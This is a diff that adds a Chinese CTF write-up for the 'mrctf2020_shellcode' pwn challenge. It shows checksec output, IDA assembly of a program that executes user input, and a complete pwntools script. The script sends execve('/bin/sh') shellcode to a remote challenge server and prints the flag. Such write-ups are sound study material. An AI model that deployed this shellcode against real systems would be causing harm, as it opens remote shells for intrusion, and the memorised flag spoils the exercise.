@@ -3071,6 +3071,106 @@ io.interactive()
 
 ------
 
+### [shellcode](https://ce.pwnthebox.com/challenges?id=1765)
+
+先`file ./mrctf2020_shellcode `查看文件类型，再`checksec --file=./mrctf2020_shellcode `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./mrctf2020_shellcode
+./mrctf2020_shellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5024a9527dd620c442aaba45f15a2e9342d58ff, for GNU/Linux 3.2.0, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./mrctf2020_shellcode
+[*] '/home/tyd/ctf/pwn/pwnthebox/mrctf2020_shellcode'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
+
+使用`IDA pro 64bit`打开附件`mrctf2020_shellcode`，按`F5`反汇编源码失败，直接查看汇编代码。`buf`大小为`0x410`字节，而`read`函数读入到`buf`的限制大小为`0x400`字节，不存在栈溢出漏洞，但是足以系统调用`shell`啦。`jg`是如果`cmp`大于则跳转，`jl`是如果`cmp`小于则跳转，`jmp`是无条件跳转指令。
+
+```assembly
+.text:0000000000001155 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:0000000000001155                 public main
+.text:0000000000001155 main            proc near               ; DATA XREF: _start+1D↑o
+.text:0000000000001155
+.text:0000000000001155 buf             = byte ptr -410h
+.text:0000000000001155 var_4           = dword ptr -4
+.text:0000000000001155
+.text:0000000000001155 ; __unwind {
+.text:0000000000001155                 push    rbp
+.text:0000000000001156                 mov     rbp, rsp
+.text:0000000000001159                 sub     rsp, 410h
+.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5
+.text:0000000000001167                 mov     esi, 0          ; buf
+.text:000000000000116C                 mov     rdi, rax        ; stream
+.text:000000000000116F                 call    _setbuf
+.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5
+.text:000000000000117B                 mov     esi, 0          ; buf
+.text:0000000000001180                 mov     rdi, rax        ; stream
+.text:0000000000001183                 call    _setbuf
+.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5
+.text:000000000000118F                 mov     esi, 0          ; buf
+.text:0000000000001194                 mov     rdi, rax        ; stream
+.text:0000000000001197                 call    _setbuf
+.text:000000000000119C                 lea     rdi, s          ; "Show me your magic!"
+.text:00000000000011A3                 call    _puts
+.text:00000000000011A8                 lea     rax, [rbp+buf]
+.text:00000000000011AF                 mov     edx, 400h       ; nbytes
+.text:00000000000011B4                 mov     rsi, rax        ; buf
+.text:00000000000011B7                 mov     edi, 0          ; fd
+.text:00000000000011BC                 mov     eax, 0
+.text:00000000000011C1                 call    _read
+.text:00000000000011C6                 mov     [rbp+var_4], eax
+.text:00000000000011C9                 cmp     [rbp+var_4], 0
+.text:00000000000011CD                 jg      short loc_11D6
+.text:00000000000011CF                 mov     eax, 0
+.text:00000000000011D4                 jmp     short locret_11E4
+.text:00000000000011D6 ; ---------------------------------------------------------------------------
+.text:00000000000011D6
+.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j
+.text:00000000000011D6                 lea     rax, [rbp+buf]
+.text:00000000000011DD                 call    rax
+.text:00000000000011DF                 mov     eax, 0
+.text:00000000000011E4
+.text:00000000000011E4 locret_11E4:                            ; CODE XREF: main+7F↑j
+.text:00000000000011E4                 leave
+.text:00000000000011E5                 retn
+.text:00000000000011E5 ; } // starts at 1155
+.text:00000000000011E5 main            endp
+```
+
+编写`Python`代码即可得到`PTB{983cfea6-e827-4ce1-8ae1-bd487168f519}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10116)
+shellcode = asm('''
+xor rax,rax
+xor rdi,rdi
+mov rdi ,0x68732f6e69622f
+push rdi              
+push rsp                 
+pop rdi
+xor rsi,rsi
+xor rdx,rdx
+push 0x3b   
+pop rax
+syscall
+''')
+# shellcode = asm(shellcraft.sh())
+io.sendline(shellcode)
+io.interactive()
+```
+
+
+
 
 
 ## Pwnable.kr
